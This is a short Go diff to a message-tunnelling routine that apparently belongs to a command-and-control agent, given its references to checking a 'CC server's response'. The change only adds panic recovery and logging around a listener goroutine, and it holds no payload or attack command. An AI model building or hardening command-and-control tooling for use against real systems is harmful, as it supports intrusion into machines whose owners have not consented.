@@ -112,8 +112,13 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 
 	// check for CC server's response
 	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				logging.Printf("MsgTunneler response listener panic: %v", r)
+			}
+			cancel()
+		}()
 		logging.Println("Check CC response: started")
-		defer cancel()
 		for ctx.Err() == nil {
 			// read response
 			// all messages are now structured MsgTunData
